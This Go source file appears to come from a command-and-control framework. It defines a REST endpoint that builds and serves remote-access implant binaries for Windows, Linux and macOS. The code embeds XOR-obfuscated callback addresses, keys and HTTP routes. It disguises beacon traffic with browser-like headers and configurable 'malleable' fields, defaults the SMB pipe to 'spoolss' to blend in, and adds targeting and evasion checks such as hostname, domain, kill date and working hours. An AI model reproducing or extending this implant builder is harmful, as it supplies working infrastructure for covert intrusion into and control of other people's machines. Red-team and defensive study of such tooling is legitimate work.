// internal/rest/handlers/payloads.go
package handlers

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"c2/internal/common/config"
	"c2/internal/websocket/agent"
	"c2/internal/websocket/listeners"

	"github.com/BurntSushi/toml"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/client"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

type PayloadHandler struct {
	db              *sql.DB
	listenerManager *listeners.Manager
	agentClient     *agent.Client
	dockerClient    *client.Client
}

func NewPayloadHandler(db *sql.DB, listenerManager *listeners.Manager, agentClient *agent.Client) (*PayloadHandler, error) {
	dockerCli, err := client.NewClientWithOpts(client.FromEnv)
	if err != nil {
		return nil, fmt.Errorf("failed to create docker client: %v", err)
	}

	return &PayloadHandler{
		db:              db,
		listenerManager: listenerManager,
		agentClient:     agentClient,
		dockerClient:    dockerCli,
	}, nil
}

// SetAgentClient updates the gRPC client
func (h *PayloadHandler) SetAgentClient(client *agent.Client) {
	h.agentClient = client
}

// Request/Response types
type BuildPayloadRequest struct {
	Listener     string       `json:"listener" binding:"required"`
	OS           string       `json:"os" binding:"required"`
	Arch         string       `json:"arch" binding:"required"`
	Language     string       `json:"language"`
	PayloadType  string       `json:"payload_type"`
	PipeName     string       `json:"pipe_name"`
	SafetyChecks SafetyChecks `json:"safety_checks"`
}

type SafetyChecks struct {
	Hostname     string        `json:"hostname,omitempty"`
	Username     string        `json:"username,omitempty"`
	Domain       string        `json:"domain,omitempty"`
	FileCheck    *FileCheck    `json:"file_check,omitempty"`
	Process      string        `json:"process,omitempty"`
	KillDate     string        `json:"kill_date,omitempty"`
	WorkingHours *WorkingHours `json:"working_hours,omitempty"`
}

type FileCheck struct {
	Path      string `json:"path"`
	MustExist bool   `json:"must_exist"`
}

type WorkingHours struct {
	Start string `json:"start"`
	End   string `json:"end"`
}

type KeyPair struct {
	PrivateKeyPEM string
	PublicKeyPEM  string
}

// BuildPayload builds a payload and returns it directly
// POST /api/v1/payloads/build
func (h *PayloadHandler) BuildPayload(c *gin.Context) {
	startTime := time.Now()

	var req BuildPayloadRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request body: " + err.Error()})
		return
	}

	// Validate OS
	osLower := strings.ToLower(req.OS)
	if osLower != "windows" && osLower != "linux" && osLower != "darwin" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid OS, must be windows, linux, or darwin"})
		return
	}

	// Validate arch
	archLower := strings.ToLower(req.Arch)
	if archLower != "amd64" && archLower != "arm64" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid arch, must be amd64 or arm64"})
		return
	}

	// Default values
	if req.Language == "" {
		req.Language = "go"
	}
	// Note: PayloadType is auto-detected from listener protocol in buildPayloadSync
	// If explicitly provided, validate it
	if req.PayloadType != "" && req.PayloadType != "http" && req.PayloadType != "smb" && req.PayloadType != "tcp" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid payload_type, must be http, smb, or tcp"})
		return
	}

	// Get listener
	listener, exists := h.listenerManager.GetListener(req.Listener)
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "listener not found"})
		return
	}

	// SMB pipe_name validation - can use listener's pipe_name as fallback
	listenerProtocol := strings.ToUpper(listener.Protocol)
	payloadType := strings.ToLower(req.PayloadType)
	if payloadType == "" && listenerProtocol == "SMB" {
		payloadType = "smb"
	}
	if payloadType == "smb" {
		// Use listener's pipe_name if not provided in request
		if req.PipeName == "" && listener.PipeName != "" {
			req.PipeName = listener.PipeName
			log.Printf("[REST API] Using pipe_name from listener: %s", req.PipeName)
		}
		// If still no pipe_name, use default
		if req.PipeName == "" {
			req.PipeName = "spoolss" // Default pipe name
			log.Printf("[REST API] Using default pipe_name: spoolss")
		}
	}

	// Build the payload synchronously
	binaryPath, binaryName, err := h.buildPayloadSync(c.Request.Context(), req, listener)
	if err != nil {
		log.Printf("Payload build failed: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "build failed: " + err.Error()})
		return
	}

	// Check if file exists
	if _, err := os.Stat(binaryPath); os.IsNotExist(err) {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "built payload not found"})
		return
	}

	// Open and stream the file
	file, err := os.Open(binaryPath)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read payload"})
		return
	}
	defer file.Close()
	defer os.Remove(binaryPath) // Clean up after sending

	fileInfo, _ := file.Stat()
	fileSize := fileInfo.Size()

	// Set response headers
	c.Header("Content-Type", "application/octet-stream")
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", binaryName))
	c.Header("Content-Length", fmt.Sprintf("%d", fileSize))
	c.Header("X-Build-Duration", fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()))

	// Stream file to response
	c.Status(http.StatusOK)
	io.Copy(c.Writer, file)
}

func (h *PayloadHandler) buildPayloadSync(ctx context.Context, req BuildPayloadRequest, listener *listeners.Listener) (string, string, error) {
	// Generate build identifiers
	initID := uuid.New()
	clientID := uuid.New()
	secret := generateRandomString(32)
	xorKey := generateRandomString(16)

	// Generate RSA keys
	keyPair, err := generateKeyPair()
	if err != nil {
		return "", "", fmt.Errorf("failed to generate keys: %v", err)
	}

	// Determine binary name
	osLower := strings.ToLower(req.OS)
	binaryName := fmt.Sprintf("payload_%s_%s", osLower, req.Arch)
	if osLower == "windows" {
		binaryName += ".exe"
	}

	// Determine payload type from listener protocol if not explicitly set
	// This matches the WebSocket service behavior
	listenerProtocol := strings.ToUpper(listener.Protocol)
	payloadType := strings.ToLower(req.PayloadType)

	if payloadType == "" {
		if listenerProtocol == "SMB" {
			payloadType = "smb"
			log.Printf("[REST Builder] Auto-detected SMB payload type from listener protocol")
		} else if listenerProtocol == "TCP" {
			payloadType = "tcp"
			log.Printf("[REST Builder] Auto-detected TCP payload type from listener protocol")
		} else {
			payloadType = "http" // Default to HTTP for HTTP/HTTPS/RPC
		}
	}
	req.PayloadType = payloadType

	// Determine connection type - this is what gets stored in DB and sent to agent service
	// "edge" for HTTP/HTTPS agents, "link" for SMB/RPC/TCP agents
	connectionType := "edge"
	if payloadType == "smb" || payloadType == "tcp" || listenerProtocol == "SMB" || listenerProtocol == "RPC" || listenerProtocol == "TCP" {
		connectionType = "link"
	}

	log.Printf("[REST Builder] Building payload - protocol=%s, payload_type=%s, connection_type=%s",
		listenerProtocol, payloadType, connectionType)

	// Store in database - use connectionType (edge/link) as type, and PRIVATE key for RSA
	// SMB profile is empty for REST API builds (SMB payloads are built via WebSocket)
	err = h.storeInit(ctx, initID, clientID, connectionType, secret, osLower, req.Arch, keyPair.PrivateKeyPEM, "")
	if err != nil {
		return "", "", fmt.Errorf("failed to store init: %v", err)
	}

	// Register with agent service - use connectionType (edge/link) and PRIVATE key
	if h.agentClient != nil {
		initData := map[string]string{
			"id":       initID.String(),
			"clientID": clientID.String(),
			"type":     connectionType,
			"secret":   secret,
			"os":       osLower,
			"arch":     req.Arch,
			"rsaKey":   keyPair.PrivateKeyPEM,
			"protocol": listener.Protocol,
		}
		h.agentClient.RegisterInit(ctx, initData)
	}

	// Load payload config
	payloadConfig, httpRoutes, malleableConfig, err := h.loadPayloadConfig()
	if err != nil {
		return "", "", fmt.Errorf("failed to load config: %v", err)
	}

	// Prepare environment variables
	envVars := h.prepareEnvVars(req, listener, clientID, secret, xorKey, keyPair, binaryName, payloadConfig, httpRoutes, malleableConfig)

	// Build the payload
	if err := h.runDockerBuild(ctx, envVars); err != nil {
		return "", "", fmt.Errorf("docker build failed: %v", err)
	}

	binaryPath := filepath.Join("/shared", binaryName)
	return binaryPath, binaryName, nil
}

func (h *PayloadHandler) storeInit(ctx context.Context, initID, clientID uuid.UUID, payloadType, secret, os, arch, rsaKey, smbProfile string) error {
	_, err := h.db.ExecContext(ctx, `
		INSERT INTO inits (id, clientID, type, secret, os, arch, RSAkey, smb_profile)
		VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
	`, initID, clientID, payloadType, secret, os, arch, rsaKey, smbProfile)
	return err
}

func (h *PayloadHandler) loadPayloadConfig() (map[string]interface{}, map[string]interface{}, map[string]interface{}, error) {
	configPath := os.Getenv("CONFIG_FILE")
	if configPath == "" {
		configPath = "/app/config.toml"
	}

	var rawConfig map[string]interface{}
	if _, err := toml.DecodeFile(configPath, &rawConfig); err != nil {
		return nil, nil, nil, err
	}

	payloadConfig := make(map[string]interface{})
	httpRoutes := make(map[string]interface{})
	malleableConfig := make(map[string]interface{})

	if pc, ok := rawConfig["payload_config"].(map[string]interface{}); ok {
		payloadConfig = pc
		if mc, ok := pc["malleable_commands"].(map[string]interface{}); ok {
			malleableConfig = mc
		}
	}

	if hr, ok := rawConfig["http_routes"].(map[string]interface{}); ok {
		httpRoutes = hr
	}

	return payloadConfig, httpRoutes, malleableConfig, nil
}

func (h *PayloadHandler) prepareEnvVars(req BuildPayloadRequest, listener *listeners.Listener, clientID uuid.UUID, secret, xorKey string, keyPair *KeyPair, binaryName string, payloadConfig, httpRoutes, malleableConfig map[string]interface{}) []string {
	// Get config values with defaults
	sleep := 20
	jitter := 10
	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
	contentType := "application/json"

	if s, ok := payloadConfig["sleep"].(int64); ok {
		sleep = int(s)
	}
	if j, ok := payloadConfig["jitter"].(int64); ok {
		jitter = int(j)
	}
	if hh, ok := payloadConfig["http_headers"].(map[string]interface{}); ok {
		if ua, ok := hh["user_agent"].(string); ok {
			userAgent = ua
		}
		if ct, ok := hh["content_type"].(string); ok {
			contentType = ct
		}
	}

	// Get route configs
	getRoute := "/api/v1/myget"
	postRoute := "/api/v1/mypost"
	getMethod := "GET"
	postMethod := "POST"
	getClientIDName := "client"
	getClientIDFormat := "%CLIENTID%"
	postClientIDName := "client"
	postClientIDFormat := "%CLIENTID%"
	postSecretName := "id"
	postSecretFormat := "%SECRET%"

	// Parse GET handlers - TOML arrays decode as []interface{}
	if gh, ok := httpRoutes["get_handlers"].([]interface{}); ok && len(gh) > 0 {
		if handler, ok := gh[0].(map[string]interface{}); ok {
			// Check if handler is enabled (default to true if not specified)
			enabled := true
			if e, ok := handler["enabled"].(bool); ok {
				enabled = e
			}
			if enabled {
				if p, ok := handler["path"].(string); ok {
					getRoute = p
				}
				if m, ok := handler["method"].(string); ok {
					getMethod = m
				}
				if params, ok := handler["params"].([]interface{}); ok && len(params) > 0 {
					for _, p := range params {
						if param, ok := p.(map[string]interface{}); ok {
							paramType, _ := param["type"].(string)
							if paramType == "clientID_param" {
								if n, ok := param["name"].(string); ok {
									getClientIDName = n
								}
								if f, ok := param["format"].(string); ok {
									getClientIDFormat = f
								}
							}
						}
					}
				}
			}
		}
	}

	// Parse POST handlers - TOML arrays decode as []interface{}
	if ph, ok := httpRoutes["post_handlers"].([]interface{}); ok && len(ph) > 0 {
		if handler, ok := ph[0].(map[string]interface{}); ok {
			// Check if handler is enabled
			enabled := true
			if e, ok := handler["enabled"].(bool); ok {
				enabled = e
			}
			if enabled {
				if p, ok := handler["path"].(string); ok {
					postRoute = p
				}
				if m, ok := handler["method"].(string); ok {
					postMethod = m
				}
				if params, ok := handler["params"].([]interface{}); ok {
					for _, p := range params {
						if param, ok := p.(map[string]interface{}); ok {
							paramType, _ := param["type"].(string)
							if paramType == "clientID_param" {
								if n, ok := param["name"].(string); ok {
									postClientIDName = n
								}
								if f, ok := param["format"].(string); ok {
									postClientIDFormat = f
								}
							} else if paramType == "secret_param" || strings.Contains(paramType, "secret") {
								if n, ok := param["name"].(string); ok {
									postSecretName = n
								}
								if f, ok := param["format"].(string); ok {
									postSecretFormat = f
								}
							}
						}
					}
				}
			}
		}
	}

	// Malleable config
	rekeyCommand := "rekey"
	rekeyStatusField := "status"
	rekeyDataField := "data"
	rekeyIDField := "id"
	if r, ok := malleableConfig["rekey"].(string); ok {
		rekeyCommand = r
	}
	if r, ok := malleableConfig["rekey_status_field"].(string); ok {
		rekeyStatusField = r
	}
	if r, ok := malleableConfig["rekey_data_field"].(string); ok {
		rekeyDataField = r
	}
	if r, ok := malleableConfig["rekey_id_field"].(string); ok {
		rekeyIDField = r
	}

	// Build custom headers JSON - read from config if available
	customHeaders := make(map[string]string)
	if hh, ok := payloadConfig["http_headers"].(map[string]interface{}); ok {
		if ch, ok := hh["custom_headers"].([]interface{}); ok {
			for _, h := range ch {
				if header, ok := h.(map[string]interface{}); ok {
					name, _ := header["name"].(string)
					value, _ := header["value"].(string)
					if name != "" {
						customHeaders[name] = value
					}
				}
			}
		}
	}
	// Add defaults if no custom headers in config
	if len(customHeaders) == 0 {
		customHeaders = map[string]string{
			"Accept":          "*/*",
			"Accept-Language": "en-US,en;q=0.9",
			"Connection":      "close",
		}
	}
	customHeadersJSON, _ := json.Marshal(customHeaders)

	// Create base environment variables (matching WebSocket service format)
	envVars := []string{
		"BUILD=TRUE",
		fmt.Sprintf("XOR_KEY=%s", xorKey),
		fmt.Sprintf("OS=%s", strings.ToLower(req.OS)),
		fmt.Sprintf("ARCH=%s", req.Arch),
		fmt.Sprintf("OUTPUT_FILENAME=%s", binaryName),
		fmt.Sprintf("CLIENTID=%s", clientID.String()),
		fmt.Sprintf("SLEEP=%d", sleep), // Pass raw value like WebSocket service
		fmt.Sprintf("JITTER=%d", jitter),
		fmt.Sprintf("MALLEABLE_REKEY_COMMAND=%s", rekeyCommand),
		fmt.Sprintf("MALLEABLE_REKEY_STATUS_FIELD=%s", rekeyStatusField),
		fmt.Sprintf("MALLEABLE_REKEY_DATA_FIELD=%s", rekeyDataField),
		fmt.Sprintf("MALLEABLE_REKEY_ID_FIELD=%s", rekeyIDField),
		fmt.Sprintf("PAYLOAD_TYPE=%s", req.PayloadType),
	}

	// Load unified link malleable config for payload injection (shared between SMB and TCP)
	linkMalleable, linkErr := config.GetLinkMalleable()
	if linkErr != nil {
		log.Printf("[REST Builder] Warning: Failed to load link config, using defaults: %v", linkErr)
	}
	envVars = append(envVars,
		fmt.Sprintf("MALLEABLE_LINK_DATA_FIELD=%s", linkMalleable.LinkDataField),
		fmt.Sprintf("MALLEABLE_LINK_COMMANDS_FIELD=%s", linkMalleable.LinkCommandsField),
		fmt.Sprintf("MALLEABLE_LINK_HANDSHAKE_FIELD=%s", linkMalleable.LinkHandshakeField),
		fmt.Sprintf("MALLEABLE_LINK_HANDSHAKE_RESP_FIELD=%s", linkMalleable.LinkHandshakeResponseField),
		fmt.Sprintf("MALLEABLE_LINK_UNLINK_FIELD=%s", linkMalleable.LinkUnlinkField),
		fmt.Sprintf("MALLEABLE_ROUTING_ID_FIELD=%s", linkMalleable.RoutingIDField),
		fmt.Sprintf("MALLEABLE_PAYLOAD_FIELD=%s", linkMalleable.PayloadField),
	)

	// Add SMB-specific config (matching WebSocket service)
	if req.PayloadType == "smb" {
		envVars = append(envVars, fmt.Sprintf("PIPE_NAME=%s", req.PipeName))

		// Create encrypted config for SMB agent (same as WebSocket service)
		// The config is XOR encrypted with the PLAIN secret
		smbConfig := map[string]string{
			"Pipe Name":  req.PipeName,
			"Secret":     secret,
			"Public Key": keyPair.PublicKeyPEM,
		}
		configJSON, _ := json.Marshal(smbConfig)

		// XOR encrypt config with the plain secret
		secretBytes := []byte(secret)
		encrypted := make([]byte, len(configJSON))
		for i, b := range configJSON {
			encrypted[i] = b ^ secretBytes[i%len(secretBytes)]
		}
		encryptedConfig := base64.StdEncoding.EncodeToString(encrypted)

		envVars = append(envVars, fmt.Sprintf("ENCRYPTED_CONFIG=%s", encryptedConfig))
		log.Printf("[REST Builder] Created encrypted SMB config for pipe: %s", req.PipeName)
	}

	// Add TCP-specific config (similar to SMB)
	if req.PayloadType == "tcp" {
		// Get TCP port from listener or use default
		tcpPort := strconv.Itoa(listener.Port)
		if tcpPort == "0" {
			tcpPort = "4444" // Default TCP port
		}
		envVars = append(envVars, fmt.Sprintf("TCP_PORT=%s", tcpPort))

		// Create encrypted config for TCP agent (same pattern as SMB)
		// The config is XOR encrypted with the PLAIN secret
		tcpConfig := map[string]string{
			"TCP Port":   tcpPort,
			"Secret":     secret,
			"Public Key": keyPair.PublicKeyPEM,
		}
		configJSON, _ := json.Marshal(tcpConfig)

		// XOR encrypt config with the plain secret
		secretBytes := []byte(secret)
		encrypted := make([]byte, len(configJSON))
		for i, b := range configJSON {
			encrypted[i] = b ^ secretBytes[i%len(secretBytes)]
		}
		encryptedConfig := base64.StdEncoding.EncodeToString(encrypted)

		envVars = append(envVars, fmt.Sprintf("ENCRYPTED_CONFIG=%s", encryptedConfig))
		log.Printf("[REST Builder] Created encrypted TCP config for port: %s", tcpPort)
	}

	// Add encrypted config values
	envVars = append(envVars,
		fmt.Sprintf("PUBLIC_KEY=%s", xorEncrypt(keyPair.PublicKeyPEM, xorKey)),
		fmt.Sprintf("SECRET=%s", xorEncrypt(secret, xorKey)),
		fmt.Sprintf("PROTOCOL=%s", xorEncrypt(listener.Protocol, xorKey)),
		fmt.Sprintf("IP=%s", xorEncrypt(listener.IP, xorKey)),
		fmt.Sprintf("PORT=%s", xorEncrypt(strconv.Itoa(listener.Port), xorKey)),
		fmt.Sprintf("GET_METHOD=%s", xorEncrypt(getMethod, xorKey)),
		fmt.Sprintf("POST_METHOD=%s", xorEncrypt(postMethod, xorKey)),
		fmt.Sprintf("USER_AGENT=%s", xorEncrypt(userAgent, xorKey)),
		fmt.Sprintf("CONTENT_TYPE=%s", xorEncrypt(contentType, xorKey)),
		fmt.Sprintf("CUSTOM_HEADERS=%s", xorEncrypt(string(customHeadersJSON), xorKey)),
		fmt.Sprintf("GET_ROUTE=%s", xorEncrypt(getRoute, xorKey)),
		fmt.Sprintf("POST_ROUTE=%s", xorEncrypt(postRoute, xorKey)),
		fmt.Sprintf("GET_CLIENT_ID_NAME=%s", xorEncrypt(getClientIDName, xorKey)),
		fmt.Sprintf("GET_CLIENT_ID_FORMAT=%s", xorEncrypt(getClientIDFormat, xorKey)),
		fmt.Sprintf("POST_CLIENT_ID_NAME=%s", xorEncrypt(postClientIDName, xorKey)),
		fmt.Sprintf("POST_CLIENT_ID_FORMAT=%s", xorEncrypt(postClientIDFormat, xorKey)),
		fmt.Sprintf("POST_SECRET_NAME=%s", xorEncrypt(postSecretName, xorKey)),
		fmt.Sprintf("POST_SECRET_FORMAT=%s", xorEncrypt(postSecretFormat, xorKey)),
	)

	// Add safety checks
	envVars = append(envVars,
		fmt.Sprintf("SAFETY_HOSTNAME=%s", req.SafetyChecks.Hostname),
		fmt.Sprintf("SAFETY_USERNAME=%s", req.SafetyChecks.Username),
		fmt.Sprintf("SAFETY_DOMAIN=%s", req.SafetyChecks.Domain),
		fmt.Sprintf("SAFETY_PROCESS=%s", req.SafetyChecks.Process),
		fmt.Sprintf("SAFETY_KILL_DATE=%s", req.SafetyChecks.KillDate),
	)

	if req.SafetyChecks.FileCheck != nil {
		envVars = append(envVars,
			fmt.Sprintf("SAFETY_FILE_PATH=%s", req.SafetyChecks.FileCheck.Path),
			fmt.Sprintf("SAFETY_FILE_MUST_EXIST=%t", req.SafetyChecks.FileCheck.MustExist),
		)
	}

	if req.SafetyChecks.WorkingHours != nil {
		envVars = append(envVars,
			fmt.Sprintf("SAFETY_WORK_HOURS_START=%s", req.SafetyChecks.WorkingHours.Start),
			fmt.Sprintf("SAFETY_WORK_HOURS_END=%s", req.SafetyChecks.WorkingHours.End),
		)
	}

	return envVars
}

func (h *PayloadHandler) runDockerBuild(ctx context.Context, envVars []string) error {
	// Check if image exists
	_, _, err := h.dockerClient.ImageInspectWithRaw(ctx, "docker_builder:latest")
	if err != nil {
		log.Println("Builder image not found, attempting to build...")
		cmd := exec.CommandContext(ctx, "docker", "compose", "-f", "/app/docker-compose.yml", "build", "builder")
		if output, err := cmd.CombinedOutput(); err != nil {
			return fmt.Errorf("failed to build image: %s", string(output))
		}
	}

	// Get host payloads path
	hostPayloadsPath := os.Getenv("HOST_PAYLOADS_PATH")
	if hostPayloadsPath == "" {
		hostPayloadsPath = "/app/payloads"
	}

	// Create container config
	config := &container.Config{
		Image: "docker_builder:latest",
		Env:   envVars,
		Tty:   true,
	}

	hostConfig := &container.HostConfig{
		NetworkMode: "host",
		Binds: []string{
			"/shared:/shared",
			fmt.Sprintf("%s/Darwin:/build/Darwin:ro", hostPayloadsPath),
			fmt.Sprintf("%s/Linux:/build/Linux:ro", hostPayloadsPath),
			fmt.Sprintf("%s/Windows:/build/Windows:ro", hostPayloadsPath),
			fmt.Sprintf("%s/SMB_Windows:/build/SMB_Windows:ro", hostPayloadsPath),
			fmt.Sprintf("%s/TCP_Linux:/build/TCP_Linux:ro", hostPayloadsPath),
			fmt.Sprintf("%s/TCP_Darwin:/build/TCP_Darwin:ro", hostPayloadsPath),
			fmt.Sprintf("%s/TCP_Windows:/build/TCP_Windows:ro", hostPayloadsPath),
			fmt.Sprintf("%s/shared:/build/shared:ro", hostPayloadsPath),
		},
	}

	// Create container
	resp, err := h.dockerClient.ContainerCreate(ctx, config, hostConfig, nil, nil, "")
	if err != nil {
		return fmt.Errorf("failed to create container: %v", err)
	}

	containerID := resp.ID
	defer h.dockerClient.ContainerRemove(ctx, containerID, container.RemoveOptions{Force: true})

	// Start container
	if err := h.dockerClient.ContainerStart(ctx, containerID, container.StartOptions{}); err != nil {
		return fmt.Errorf("failed to start container: %v", err)
	}

	// Wait for container to finish
	statusCh, errCh := h.dockerClient.ContainerWait(ctx, containerID, container.WaitConditionNotRunning)
	select {
	case err := <-errCh:
		if err != nil {
			return fmt.Errorf("container wait error: %v", err)
		}
	case status := <-statusCh:
		if status.StatusCode != 0 {
			// Get logs for debugging
			logReader, _ := h.dockerClient.ContainerLogs(ctx, containerID, container.LogsOptions{ShowStdout: true, ShowStderr: true})
			if logReader != nil {
				logs, _ := io.ReadAll(logReader)
				logReader.Close()
				return fmt.Errorf("build failed with exit code %d: %s", status.StatusCode, string(logs))
			}
			return fmt.Errorf("build failed with exit code %d", status.StatusCode)
		}
	case <-ctx.Done():
		return ctx.Err()
	}

	return nil
}

// Helper functions
func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		b[i] = charset[n.Int64()]
	}
	return string(b)
}

func generateKeyPair() (*KeyPair, error) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	// Encode private key - use PKCS1 format and base64 encode for storage
	privateKeyBytes := x509.MarshalPKCS1PrivateKey(privateKey)
	privateKeyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: privateKeyBytes,
	})

	// Encode public key - use PKCS1 format (RSA PUBLIC KEY) to match WebSocket service
	publicKeyBytes := x509.MarshalPKCS1PublicKey(&privateKey.PublicKey)
	publicKeyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PUBLIC KEY",
		Bytes: publicKeyBytes,
	})

	return &KeyPair{
		// Base64 encode private key to match WebSocket service format
		PrivateKeyPEM: base64.StdEncoding.EncodeToString(privateKeyPEM),
		PublicKeyPEM:  string(publicKeyPEM),
	}, nil
}

func xorEncrypt(plaintext, key string) string {
	result := make([]byte, len(plaintext))
	for i := 0; i < len(plaintext); i++ {
		result[i] = plaintext[i] ^ key[i%len(key)]
	}
	return base64.StdEncoding.EncodeToString(result)
}
